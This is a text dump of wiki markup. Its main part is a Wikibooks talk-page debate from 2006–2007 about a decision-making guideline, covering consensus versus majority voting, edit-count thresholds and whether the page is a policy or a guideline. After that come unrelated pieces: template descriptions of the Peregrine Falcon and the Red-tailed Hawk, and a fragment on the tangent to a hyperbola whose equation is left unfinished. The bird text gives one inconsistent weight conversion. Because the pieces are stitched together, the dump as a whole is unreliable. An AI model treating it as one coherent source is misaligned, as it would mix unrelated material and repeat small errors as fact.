I've made some changes to the policy [http://en.wikibooks.org/w/index.php?title=Wikibooks%3AGeneral_voting_rules&amp;diff=560175&amp;oldid=560045 HERE]. The new text removes all reference to the word &quot;vote&quot;, which has been pointed out is not a good word to use when describing the consensus process. Also, I have removed all mention of minimum edit counts. The reason why I removed the edit count minimum clause is because I included text that says votes should be judged on a qualitative basis, not a quantitative basis. My vote isn't more important then any other vote because of my edit count alone. Even a first-time user can give a meaningful, well-thought-out opinion on a topic, and an old timer can give an insubstantial or unmotivational one-liner. A simple &quot;yes&quot; or &quot;no&quot; vote doesnt matter, regardless of who casts it.

I hope these changes are for the best, and that I haven't introduced any new problems to the policy. Because of all these changes, The previous straw poll (above) should be disregarded. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 20:50, 17 August 2006 (UTC)
:I wouldn't mind keeping some mention of needing previous or planned activity on Wikibooks because that will keep swoop-in votes in check. I just want to see that the user has some establishment in the project before weighing in their comments. I don't think it's fair to the community for an outside voter to come in, no matter how profound their comments are. I don't vote in other countries' elections. I might know how to make a good decision in Germany, but it's still not my right. I want some Wikibooks &quot;citizenship&quot; and would like that included somehow. Ideas? -[[User:Withinfocus|&lt;font color=&quot;#000000&quot;&gt;'''within'''&lt;/font&gt;]][[User talk:Withinfocus|&lt;font color=&quot;#7A7A7A&quot;&gt;'''focus'''&lt;/font&gt;]] 01:04, 18 August 2006 (UTC)
::Even if we include the 20 contrib limit, 20 contributions hardly makes a &quot;citizen&quot; here. A person who is making 1 edit a month over 20 months isn't conceptually any better then a &quot;swoop-in voter&quot;. If a person knows our system, and can make relevant comments/observations within that framework, then that should be all that matters. Now, if a person says something that demonstrates a blatant disregard for our policies and our community, then we know that it isn't worth while. Also, i might want to mention that the vast majority of the wikibooks &quot;citizenship&quot; is most likely comprised of readers, not writers. People who have been readers here for a long time might find a discussion worthy for their first contribution. That doesnt mean that their opinions don't count, if anything, it's profound that their first contribution was input to our discussion processes. In short, people who know our policy and our community will demonstrate that knowledge, people who don't know us will demonstrate that as well. We should be able to pick out the differences, and make judgements accordingly. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 01:26, 18 August 2006 (UTC)

== Hang on a sec ==
This proposal has, over time, expanded somewhat from being about general voting rules (ie when we vote, what are the rules, not when do we vote) to being about our decision-making process generally. This expansion of scope is making getting agreement difficult. Two possible routes - (1)contract the scope back down to voting rules alone; or (2) move the page to [[Wikibooks:Decision-making]] and try to iron out all the new concerns. Personally I'd prefer route 1. Once that is complete, it would be possible to move to route 2 later.

If we are to go down route 2, I'd like to see the whole process section removed and replaced by the flowchart. The flowchart does need some amendments - replace &quot;block&quot; with &quot;oppose/opposition&quot; and replace &quot;synthesize concerns&quot; with &quot;outline concerns&quot;. I'd also like to see that as a suggested, not a forced, route to getting consensus.

Finally, I'm still not sure about VfD. I'm not at all convinced that we look for consensus - I think we weigh up the arguments as to whether a module or book is consistent with our inclusion criteria. Comments unrelated to that point, whilst not quite ignored, are downgraded. Ultimately 3 votes for deletion and 8 votes against may end up with the article being deleted, depending on the nature of those votes. And compromise here is often impossible - either the text stays or it goes - there is often little middle-ground, [[User:Jguk|Jguk]] 07:58, 18 August 2006 (UTC)

:Oh, I should add that I'd quite like a bit that says we should aim to follow the spirit of the policy, not necessarily the letter. Principle-based rather than rule-based policies are far better. Maybe even remove the 20 edit minimum and replace it with &quot;regular good faith contributor&quot; or something along those lines, [[User:Jguk|Jguk]] 08:18, 18 August 2006 (UTC)

::Yup, I was wondering if the name of the page shouldn't be changed. I think both option 1 ''and'' 2 would be good, but is there really that much to talk about if we're only talking about votes on topics that already have established rules?
::As far as the VfDs are concerned, I think consensus is more valuable than voting, especially as the criteria for keep and delete seem to be based on the debates held on that page (we seem to be precedent-oriented), rather than on more &quot;formal&quot; guidelines. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 10:13, 18 August 2006 (UTC)

:: I think that the option 1 is better as it simplyfies the discussion and allows for faster consensus. That being done, there could be another guideline/policy on the decision process which relies on the voting guideline/policy.
:: I agree with the following the spirit rather than the letter of the policy. As such, these should rather be guidelines than policies. Once the guidelines are up, they can be polished depending on how well they work. If they need to be enforced more strictly, they can be changed into policies.
:: As for the &quot;20 edits&quot; vs. &quot;good faith editors&quot;, I stongly favour the second.
::* An editor may come to Wikibooks and study its policies before taking an active part in the project and finish his 20 &quot;bona fide&quot; (this very term is going to cause trouble) edits.
::* An editor may have been editing his quiet little corner of Wikibooks without any interest in policy.
::* Given that we are trying to reach consensus, it is not the sheer number of votes that counts but rather the quality of the arguments.
:: --[[User:Swift|Swift]] 01:42, 20 August 2006 (UTC)

:::I am  against making this a guideline, because I dont want to see people saying &quot;We dont ''need'' consensus, it's just a guideline, and we can just use a majority rule here to make a decision if we want.&quot; I also don't want wikibooks to run on an oligarchy system, where older or more active users demand more respect and authority then other users. Every user, from 0 contribs up to 10,000 or more all get an equal oportunity to help shape wikibooks, and minorities should never be disenfranchised by the majority. The way of doing business here at wikibooks is through community consensus, and we should make this an official &quot;policy&quot; instead of simply a guideline, because this is the official way in which things should work: There are no acceptable alternatives. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 15:21, 20 August 2006 (UTC) 

:::: If there isn't a consensus and the majority pushes it's view on the rest, there will be a full out edit war (unless all the admins are on one side...). Consensus isn't just a good idea. It's a necessity. I think that will be a good part in &quot;enforcing&quot; the guideline. I do see your point. I'm just not sure it's a problem and think it would be better to start out with a guideline. If it doesn't work, changing to a policy shouldn't be too painful a process.
:::: &quot;''I also don't want wikibooks to run on an oligarchy system[...]''&quot;. Wholeheartedly agree!
:::: &quot;''minorities should never be disenfranchised by the majority''&quot; Which is the reason for consensus, sure, but this can also be used to argue for a minimum numer of edits or &quot;established user&quot; etc. since it could place the &quot;regulars&quot;/&quot;old-timers&quot; in a minority if there were a rally vote of new users. That said, I do like the ideal of not barring newcomers from taking full part of the community, but I do eye some potential hasards (in a guideline, these could be addressed as needed).

:::::But if &quot;consensus&quot; is only a guideline, people can choose do disregard it, in favor of other decision methods. It's a small semantic difference, but it is very important. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 21:02, 20 August 2006 (UTC)

:::::: Exactly. I see this as a strenght. It does not bind us into a policy that may prove inappropriate in some (as yet unforseen) cases.
:::::: Perhaps our difference of oppinion comes from how we see the guideline implementation. I've always understood the policy/guidelines as the &quot;must&quot;/&quot;should&quot;s of [http://www.ietf.org/rfc/rfc2119.txt IETF RFC 2119]. A policy tells us what ''must'' be done, the guideline what ''should'' be done. As can be read in the RFC, the definition of ''should'' states
::::::&lt;blockquote&gt;&quot;that there may exist valid reasons in particular circumstances to ignore a particular item, but the full implications must be understood and carefully weighed before choosing a different course.&quot;&lt;/blockquote&gt;
:::::: According to this, no-one will be able to disregard the guideline without a '''very''' good reason. I don't see the guideline as a weak &quot;this would be cool, but do what you like&quot; (that's more what an essay is) nor as a &quot;weak&quot; policy. I see it as a ruleset for situations where there (may) exist exceptions and where the spirit of the law is more important than the letter.
:::::: I think it could be a very useful first step in adopting what will be a very important part in Wikipedia's decision making. The guideline allows us to learn from experience using different decision methods depending on the situation and, as I mentioned earlier, respond to unforseen situations. --[[User:Swift|Swift]] 06:48, 21 August 2006 (UTC)

::::::: Okay, i'll accept your argument, on the understanding that if instantiating this proposal as a &quot;guideline&quot; fails, we can reconsider it as a policy. I am still unsure whether we can pass this as a guideline even, much less as a policy. Wikibooks currently doesnt have many (if any, at this point) &quot;guidelines&quot;, so it might be good for us to put into explicit writing the relationship between policies and guidelines, perhaps on [[WB:WIW]]. I still don't think i quite understand why it must be a guideline and not a policy, especially with the inclusion of the &quot;follow the spirit of the policy&quot; text that has been included at the end. When following the spirit, the letter of the policy can be disobeyed, so long as the philosophical principles behind the letter are understood and obeyed. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 12:14, 21 August 2006 (UTC)

:::::::: Actually, we do have a number of [[WB:PAG#Guidelines|guidelines]] (not all are explained with their own pages, though) and near the top of the page, the two terms are defined (though I find &quot;guideline&quot; to be rather poorly so).
:::::::: &quot;''why it must be a guideline and not a policy''&quot;. It's not that it ''must'' be. It is simply my oppinion that it may be too restrictive. I think the mentality should always be: &quot;Why must it be a policy, not a guideline&quot;.
:::::::: &quot;''especially with the inclusion of the &quot;follow the spirit of the policy&quot;''&quot;. Especially with this, it should be a guideline, since this pretty much renders the policy as that. --[[User:Swift|Swift]] 19:20, 21 August 2006 (UTC)

:Every change that is made, it seems, makes a few users happy, and a few more users unhappy. I'm starting to wonder if this community is capable of creating a voting policy at all. As to your first concern, it has been pointed out to me that the process of making a decision via consensus rarely involves any actual &quot;voting&quot;. To that effect, it's been my philosophy since we began this discussion that a voting policy (or, better yet, a &quot;decision-making&quot; policy, as you have pointed out) should be short, vague, and open to interpretation. All I wanted to do was specify consensus as the primary decision tool, not majority voting. By keeping it simple and general I think we can create an effective policy, but avoid too much instruction creep. Our &quot;voting&quot; here should be done by consensus, and any policy about it therefore should describe the consensus process (which is the &quot;voting process&quot;). Unfortunately (or fortunately, depending on how you look at it) &quot;consensus&quot; is a broad term, and latitude needs to be given for it.
:I will add a bit about &quot;the spirit of the policy&quot; right now. I've already removed the 20-contrib minimum rule, and replaced it with text that prizes quality comments over quantity comments. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 13:17, 18 August 2006 (UTC)
:Also, as to your comments about the VfD thing, I still maintain that VfD is a &quot;high impact&quot; decision, although the rules outlined here for &quot;high impact&quot; decisions don't necessarily fit the way VfDs work. I don't think this is an issue however, especially not with the addition of the &quot;spirit of the policy&quot; text that you suggested. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 13:24, 18 August 2006 (UTC)

#:::I disagree. This policy specifically redefines the word &quot;vote&quot; to mean a discussion with multiple possible outcomes.

Now, I conceed that perhaps there is a conceptual difficulty in using the word &quot;vote&quot;, but we could change that word, and not affect the meaning of the policy.

The process expounded is reasonable, but I'm worried that it is too dogmatic. Who did the flowchart earlier - could we replace the whole &quot;process&quot; section with that flowchart? I've also moved VfD from high impact to low impact. Largely the decisions are low impact - they don't affect the project as a whole. Occasionally, key points on how to interpret our inclusion criteria are raised. Where that is the case, I agree the point of policy may be high impact - but for most nominations, the decision does not have sitewide importance.

#::Version 5 was supposed to be simply a prose rewrite of version 5, in an effort to use more &quot;language&quot; and fewer bullets. It was my intention that the text of version 5 should mirror the intent of version 4. I apologize if my goals were not met in this regard. Is there any specific text we can change on here to make it better reflect the points of version 4? If we replace the process with Kellen's flowchart, would that be more acceptable? I also disagree with you about VfD. Votes to delete can have a profound impact on our community. Look at the votes to delete the videogame guides. Look at the initial VfD to delete Wikiversity. Entire groups of people can be disenfranchised from our project if we vote to delete their books. Look at the growing debate on VfD right now, where we are discussing deleting a single page out of the [[Chemical Synthesis]] book: That discussion is helping to shape this very policy, in addition to testing our current deletion policy. I think that VfD discussions should stay high-priority for all these reasons. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 16:56, 17 August 2006 (UTC)
#:::That's probably why I prefer version 4 - I think it's better using fewer words and being punchier. Why have longer prose if it doesn't add anything? On deletion (the proposal refers to deletion, not just to VfD), I think there are a number of clear-cut cases where deletion can be summary (ie speedy deletions). When we have a VfD discussion, we discuss whether the module/book meets our inclusion criteria. Many of these discussions are relatively humdrum - they do not have a sitewide effect. Others, as you note, are more important as they get down to the crux of what exactly are our inclusion criteria. We decide, and we should decide, deletion matters in a way that takes account of the relevant importance of that decision.

I think the section [[Wikibooks:Decision making#Following this Policy]] is now redundant. Firstly it's not a policy, so at the very least that should be changed.

==Does this guideline give rise to a decision? ==
[[User:Swift|Swift]] has just removed the text that provides an end point to the decision making process (on the third repetition of the process a majority vote would prevail).  Now, either we need a guideline for decision making or not. A guideline that explicitly does not end in a decision is fatally flawed; it is not a &quot;decision making&quot; guideline at all. 

In the absence of an end point the guideline says discuss the problem, discuss it some more and if you cannot agree '''unanimously''' forget it.  Of course, this just means that if one side feels sufficiently self important or is part of a gang they will just bully dissenters into accepting their view (see above). Alternatively, if none of the parties are inclined to gang behaviour there will be no decision. [[User:RobinH|RobinH]] 11:36, 25 August 2006 (UTC)

:&quot;No consensus&quot; generally does kill the action in question, yes. It's aggravating sometimes, but that's just how consensus works... slowly and very carefully. There can come a point in the discourse where the decision becomes rendered as &quot;consensus with notable objections&quot;, and we'll know when it's time for that.
:The kinds of decisions we're talking about are either (a) making a policy that somehow or another restricts all wikibookians, (b) removing a restriction that will change the traditional structure of wikibooks, or (c) deleting something a wikibookian worked on. Seems to me that these decisions ''should'' be difficult, and shouldn't have an arbitrary limit. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 11:46, 25 August 2006 (UTC)

::I agree, there either is consensus or there is not. Consensus can be either positive or negative, such as &quot;yes, we all agree&quot; or &quot;no, we all oppose&quot;. Either situation is a definative end-point to the discussion (at least until somebody later wants to reconsider the matter, and reopens the discussion). If there is no consensus, the discussion is not over; not, that is, unless people all say &quot;we can't agree on this, so we will all drop it&quot;, which is effectively similar to saying &quot;No, we all oppose&quot;. Barring this (if everybody doesnt &quot;give up&quot;), the discussion can continue ad infinitem until one of the 3 outcomes is acheived. Consider the US supreme court (for those of you familiar with it): The supreme court can choose to hear a case from a lower court and then pass judgement, or it can choose not to hear the case at all. This third option (judge &quot;yes&quot;, judge &quot;no&quot;, ignore) works like a tacit agreement of the previous ruling, which reduces the possible outcomes to &quot;yes&quot; or &quot;no&quot;. If the supreme court then chooses not to hear a case (analogous to our being inable to acheive consensus), the matter never gets &quot;judged&quot; per se, but there is still a definate outcome where the status quo is maintained.
::I think a trap that some people are falling into is thinking that matters can be decided by concrete metrics, and that once a matter is decided, it is over and done. Wikibooks policy is (or should be) a more organic process where people are free to discuss the issues forever, and to come to compromises. Also, once a policy is proposed, it should be ''harder'' to institute it then it would be to reject it. Changes to the status quo require that not only does our &quot;supreme court&quot; have to hear the case, but that they have to decide in favor of it. In essence, to institute a change, we must reach consensus on the matter, and that consensus should be in favor of the change. There shouldn't be a way to &quot;force&quot; the outcome one way or the other. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 12:24, 25 August 2006 (UTC)

: OK, this may be a semantic problem. Certainly, absolute consensus would never work in practice (frankly, I don't even like it in theory). I understood it as implied that consensus should be used as an approach to a lofty ideal.
: In my defence, I believe most others here who agreed with it had the same understanding. Perhaps this is due to interwiki-ing of concepts and practices. Wikipedia calls the method Wikipedians use to make most decisions consensus &amp;mdash; and it works. Consensus driven debate drives people to compromise which brings people together rather than tear them apart. See simply the discussion on this guideline. If we had a certain percentage for decisions, many would bury themselves into trenches and we'd be voting on every single thing hoping to reach that magic number. There would be rallying, not of experienced users, but of like minded ones banding together to achieve each others goals. Consensus weighs the quality of the arguments, not just the number. I thought this was clear. I see how I was wrong and apologise.
: &quot;''just removed the text that provides an end point to the decision making process''&quot;. I removed text that was added after the proposed policy was accepted as a guideline. Yes, it was done rather hurriedly, but it had been under lengthy discussion and was an hindrance to other pressing business. Furthermore, even in your stringent understanding of consensus, it is no less an endpoint in a decision making process. It simply shifts the necessary portion of those in agreement to 100%. --[[User:Swift|Swift]] 12:41, 25 August 2006 (UTC)

I agree, there are huge problems with semantics here. 

SBJohnny said '''&quot;consensus with notable objections&quot;''' is required. This is a majority vote after lengthy discussion.

Whiteknight said: '''&quot;Consensus can be either positive or negative, such as &quot;yes, we all agree&quot; or &quot;no, we all oppose&quot;'''.  This is unanimous decision taking. Why not call it unanimous decision taking?

I do not really understand what Swift means by consensus. Swift seems to be suggesting that consensus is 100% support for a proposal but I am not sure.

Everybody seems to be using the word &quot;consensus&quot; to support their own view without defining it. I propose that we stop using the word &quot;consensus&quot; in this discussion and assume that all participants would like the decision making process to be fair, take into account the views of all parties and not allow preemptive action. 

A guideline for decision making should outline a process and describe an end point at which a decision is either made or rejected. (Rejection could occur because most people are against the proposal or because the proposal cannot be agreed). Can we define such a guideline?  

The current guideline has no end point. Perhaps this is deliberate but in this case there is no real need for a guideline. Those inclined to obstructionism or bullying and gang behaviour will simply get their own way. [[User:RobinH|RobinH]] 18:54, 25 August 2006 (UTC)

:I still disagree with you on these points (and frankly, i doubt that you and I will ever agree on this subject!). Let's consider the (admittely flawed) example of a VfD discussion. Some people want the module in question to be deleted, some want it merged, some want it transwikied, and some want it kept unscathed. In a majority voting, worst-case scenario, a given faction could make a decision on the fate of the module with only '''26% of the total votes'''. Decision making based on a 26% &quot;majority&quot; is simply unacceptable. That rules out majority voting. Note also that &quot;unanimous decision making&quot; won't happen either: it is unlikely that 100% of all people will up and change their vote. Some of the deletes might change to transwiki, and some of the keeps might change to merge, but will 100% of everybody agree on what to do? I don't think a unanimous decision process is acceptable either: it is unlikely that anything would ever be decided. Remember, we want a decision-making process that actually enables decisions to be made, and unanimous decisions won't fullfill that role. Consensus can exist even in the presence of objections: people can agree to disagree, people can compromise, people can bow to the will of the community, they can ask that the decision be made on a trial basis, etc. 
:I also would like to point out that from my perspective, this guideline does have a specific end point, and that it is necessary for that reason and for others. This guideline has end points on step 5 (affirmative decision) and step 6 (bullets 1 and 5 lead to a &quot;no consensus&quot; result, which is an implicit &quot;reject&quot;, and bullet 4 which is an &quot;accept&quot;). Discussions themselves do not need definitive ending points: discussion can be continued forever until a suitable decision has been reached, and discussions which have previously ended in a decision can be reopened for discussion at any time. Remember, the community ''must work harder to make change''. Failure to come to a consensus is an implicit ending point: no consensus means change cannot happen.
:Also, as to your &quot;''can we define such a guideline''&quot; comment, it's my full understanding and belief that this is such a guideline, and that it addresses all your concerns specifically. We could alter the text perhaps to make that more clear, but i don't agree that we need to make any substantive changes in the underlying principles. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 19:14, 25 August 2006 (UTC)
::PS. Based on recommendations from several users, this was made into a '''guideline''', and not a '''policy'''. While I feel the distinction is small (and perhaps unnecessary), the text of the {{tl|guideline}} template states that this &quot;should&quot; be followed, as opposed to &quot;must&quot; be followed. In extenuating circumstances where this policy seems to break down, it is permissible to do things a different way (with the understanding that the spirit of this guideline be well understood, and the reasons for breaking from it be significant). --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 19:20, 25 August 2006 (UTC)

:::&quot;Failure to come to a consensus is an implicit ending point: no consensus means change cannot happen.&quot; As you know, this worries me because it allows blocking and encourages gangs to take action if they consider that they are being blocked in bad faith. 

:::Will the guideline be a problem in its current form?  I think there is little risk this year that people will use it to block decisions. Perhaps in the future if Wikibooks becomes more popular. So I would be happy to &quot;not oppose&quot; the guideline and simply abstain for the moment.

::::''SBJohnny said '''&quot;consensus with notable objections&quot;''' is required.'' I didn't say that... I said that consensus might be said to be rendered, even if there are notable objections. It's not about 100% or nothing, n% or n+1% don't come into it at all really, because it's not a vote. It's weighing the arguments, and seeing what makes sense. When the adoption or repeal or a policy would end up changing the project so that it becomes a different project, it can be held up indefinitely, yes. And those who insist on the changes will just end up going to another project, because they'll want to do what they want to do. They'll probably get mad about it too, and stomp a bit.

:::::But suppose one user does block a decision. You believe this will occur indefinitely. But read the comments above about stopping people who do not &quot;act in good faith&quot; - a single user can indeed block the entire community until they gang up on him like in the school playground.  He will then be beaten up unceremoniously and kicked out of Wikibooks. Your lone defender will not win even though he should win according to the current text of this policy. The text is flawed and encourages anarchic, bullying behaviour. The way round this is to have a proper decision point in the policy. [[User:RobinH|RobinH]] 09:06, 30 August 2006 (UTC)

::::::But I would consider you to be a &quot;lone defender&quot; in this situation (at least, the only one voicing a dissenting opinion at the moment), and you have been neither bullied nor kicked out of the community. The very fact that this discussion is still carrying on as it is, that we haven't stopped it arbitrarily and said &quot;Whiteknight and SBJohnny versus RobinH, RobinH loses by majority decision&quot; is proof that the concept works, and there is no bullying involved. You are allowed to continually speak your opinions, you are allowed to disagree with me all you want: We will likely never come to an agreement, consensus will not be acheived, and the status quo will not change. If we went through your process, and tried to acheive consensus three times (assuming you would continue to dissent) but failed, the matter would simply be put to a majority vote, you would lose, and it would all be a waste of your time: That kind of majority-rules BS is exactly the kind of bullying that we should be watchful of.

:::::::In the UK we describe opposition parties as &quot;Her Majesty's Loyal Opposition&quot;.

I can argue against a policy but still be a loyal Wikibookian, accepting the majority view.  As I said above, I am not opposing in this case, if it came to a vote/final decision I would abstain rather than block. But I do feel that this policy is missing an opportunity to define a real decision making process. 

:::::::In normal circumstances I would indeed be prepared to accept a majority decision.  I would encourage you to change the text so that on the 3rd attempt over 6 months the majority wins, I will then accept your majority decision(!) [[User:RobinH|RobinH]] 13:05, 31 August 2006 (UTC)

(reset indent)I definately understand you, and I would never accuse you of being disruptive or not &quot;loyal&quot;. But, there is a difference between rational, &quot;loyal&quot;, opposition and disruptive opposition. If you are acting rationally, it is assumed that you are dissenting with the best interests of wikibooks in mind, and that does need to be taken into accout. First off, I can't agree with your wording about &quot;consensus being blocked 3 times&quot;, because that simply cannot happen: Even if a user opposes, we don't say &quot;No consensus, we were blocked, let's try again from the beginning&quot;. The original discussion continues until a decision is reached (or until the idea is abandoned, which probably won't lead to an additional attempt). 
Now, the primary reason why I agreed to make this into a guideline, and not into a policy is to address such concerns as yours. Uner the guideline, people ''should'' try to do things this way, but if this method fails, especially over a long period of time, people can choose to make the decision in another manner (so long as everbody understands that a decision that is not made through consensus may not carry as much weight as one that is). If you feel that the consensus process isn't working, you can feel free to try an alternate method, if all parties can agree on that alternate method. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 13:15, 31 August 2006 (UTC)

== Minor change, addition ==
I've added the following text under the &quot;Low-Impact Decisions&quot;:
:''Creating or altering the content, structure or scope of a particular book''
I think that's precisely one of the kinds of low-impact decision situations that arise here on wikibooks, but one that strangely didnt make it into the text of this policy. I have been bold and added this text as I felt appropriate, although we can remove it again if there are objections. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 16:07, 20 December 2006 (UTC)

== Wordiness == 
Maybe it's all those kid's books I've been working on, but this guideline seems overly wordy and long to me. Guidelines and policies should strive for brevity. For example, the second paragraph reads: 
:''Issues at wikibooks can be divided into two different categories, depending on the extent to which they affect the wikibooks community over time. The decisions that have a large, long-term effect on wikibooks are called high impact decisions. Otherwise they are low impact decisions.'' 
Couldn't this be rephrased: 
:''Some decisions that have long term effects are high impact decisions, others with more limited effects are low impact decisions.'' 

The text as it stands has a Gunning Fog index of more than 17 (indicating that a person would require 17 years of formal education to understand the text on the first reading.) It is also more than 1100 words. I reworked the document quickly and got it down to less than 840 words and a GF of 14.8 without changing the meaning of the document (or so it seemed to me). Surely we can do better? --[[User:Xixtas|xixtas]] 06:02, 11 January 2007 (UTC)

: To be clear I recognize I'm something of a fanatic on this issue and will confess to having fallen asleep a few nights ago trying to figure out how to simplify &quot;A is for Apple&quot;. I wouldn't block adoption of this policy based on this objection. --[[User:Xixtas|xixtas]] 06:34, 11 January 2007 (UTC)</text>

| description = The '''Peregrine Falcon''' (''Falco peregrinus''), sometimes formerly known in North America as '''Duck Hawk''', is a medium-sized falcon about the size of a large crow: {{units|38-53 cm|15-21 in}} long. The English and scientific species names mean &quot;wandering falcon&quot;, and refer to the fact that some populations are migratory. It has a wingspan of about {{units|1 meter|40 in}}. Males weigh {{units|570-710 grams|1.3-1.6 pounds}}; the noticeably larger females weigh {{units|910-1190 grams|2.0-2.6 pounds}}. 

The Peregrine Falcon is the fastest creature on the planet in its hunting dive, the stoop, in which it soars to a great height, then dives steeply at speeds in excess of {{units|320 km/h|200mph}} into either wing of its prey, so as not to harm itself on impact. In its stoop, the Peregrine Falcon attains the highest speed of any animal. The fastest speed recorded is {{units|390 km/h|242.3 mph}}.

The fledglings practice the roll and the pumping of the wings before they master the actual stoop.

Peregrine Falcons live mostly along mountain ranges, river valleys, coastlines, and, increasingly, in cities. They are widespread throughout the entire world and are found in all of the continents except Antarctica. 

Peregrines in mild-winter regions are usually permanent residents, and some birds, especially adult males, will remain on the breeding territory. However, the Arctic subspecies  migrate; ''tundrius'' birds from Alaska, northern Canada and Greenland migrate to Central and South America, and  all ''calidus''  birds from northern Eurasia move further south or to coasts in winter.

Australian Peregrine Falcons are non-migratory, and their breeding season is from July to November each year.

Peregrine Falcons feed almost exclusively on birds, such as doves, waterfowl and songbirds, but occasionally they hunt small mammals, including bats, rats, voles and rabbits.  Insects and reptiles make up a relatively small proportion of their diet.  On the other hand, a growing number of city-dwelling Falcons find that feral pigeons and Common Starlings provide plenty of food. Peregrine Falcons also eat their own chicks when starving.

Peregrine Falcons breed at approximately two or three years of age.  They mate for life and return to the same nesting spot annually.  Their courtship flight includes a mix of aerial acrobatics, precise spirals, and steep dives. The male passes prey it has caught to the female in midair. To make this possible, the female actually flies upside-down to receive the food from the male's talons.  Females lay an average clutch of three or four eggs in a scrape, normally on cliff edges or, increasingly, on tall buildings or bridges.  They occasionally nest in tree hollows or in the disused nest of other large birds.

The average life span of a Peregrine Falcon is approximately eight to ten years, although some have been recorded to live until slightly more than twenty years of age.

| description = The '''Red-tailed Hawk''' (''Buteo jamaicensis'') breeds from western Alaska and northern Canada to Panama and the West Indies. Males are typically smaller than females, generally weighing between {{units|800–1100 grams|1.8-2.4 pounds}} and measuring {{units|45–56 cm|1'5.7&quot;-1'10&quot;}} in length. Females typically average between {{units|1100–1300 grams|1.8-2.9 pounds}} and measure {{units|50–65 cm|1'7.7&quot;-2'1.6&quot;}} in length. 

This is one of three species colloquially known in the United States as the &quot;chickenhawk&quot;. It is the most common North American hawk and the raptor most frequently taken from the wild (and later returned to the wild) for falconry in the United States.

Birds of this species have a dark mark along the leading edge of the underwing, between the body and the wrist. Most, but not all color variations have a dark band across the belly. In most, the adults' tails are rusty red above, and juveniles have narrow brown and pale bands. The main western North American population has bands on the adults' rusty tails as well and has varied plumage, organized into three main color types or morphs. 

Immature birds, or birds that are only a few years old, can also readily be identified by having yellowish irises. As the bird attains full maturity over the course of 3–4 years, the iris slowly darkens into a reddish-brown hue.

The breeding habitat is open country with high perches. They build a stick nest in a large tree, in a cactus, or on a cliff ledge 35 m or higher above ground; they may also nest on man-made structures.  Both sexes build the sturdy nest, made of different sized twigs and sticks, lined with fresh green foliage and evergreen sprigs.  The fresh sprigs are regularly replaced during incubation.  Up to four eggs may be laid at daily intervals.  The shells are colored a dull or bluish-white with a granulated or smooth surface, never glossy.  There may be some splotches of various shades of brown.   Incubation is by the female from 28 to 35 days, during which time she is fed by the male.  The young are able to fly at about 45 days.  

In most of the United States, Red-tailed Hawks are permanent residents, but northern breeding birds migrate south in winter.  Throughout their range in the U.S., Red-tailed Hawks receive special legal protections under the [[w:Migratory Bird Treaty Act of 1918|Migratory Bird Treaty Act of 1918]]. They have a complex relationship with humans, capable of both controlling rodent and other mammalian pests, and on occasion taking valuable fowl (which has led to them being one of the species described as a Chickenhawk). 

Red-tailed Hawks prefer to wait on a high perch and swoop down on prey; they also patrol open areas in flight. They mainly eat small mammals, birds and reptiles.  Their favorite prey varies with regional and seasonal availability but includes most types of rodents, rabbits, pheasant, grouse, quail, rattle snakes, copperheads, lizards, and, when near the water's edge, carp and catfish. Those that live in cities may prefer pigeons and starlings, both of which are plentiful in many urban areas.

In flight, these hawks soar with wings in a slight dihedral, flapping as little as possible. They sometimes hover on beating wings and sometimes &quot;kite&quot;, or remain stationary above the ground by soaring into the wind.  When soaring or flapping their wings, they typically travel from 30 km/h to 65 km/h, but when diving may reach speeds as high as 195 km/h. 

The Red-tailed Hawk is common and widespread, partly because it has benefited from the historic settlement patterns across North America.  The clearing of trees in the east of North America provided hunting areas, and the practice of sparing woodlots left nest sites. Conversely, the planting of trees in the west provided nest sites where there had been none. The construction of highways with treeless medians and shoulders and with utility poles alongside provided perfect habitat for perch-hunting, so Red-tailed Hawks are now a common sight along highways. 

A certain recording of the cry of the Red-tailed Hawk is probably one of the most often heard cinematic sound clichés. This high, fierce scream is often featured in the background of adventure movies to give a sense of wilderness to the scene.  However, the cry is more commonly used for the Bald Eagle, whose own vocalizations are quite different.

=== Tangent to a hyperbola: Cartesian approach ===

:&lt;math&gt;\begin{align}
0                           &amp;= \frac{2x}{a^2} - \frac{2y}{b^2}\frac{dy}{dx} \\

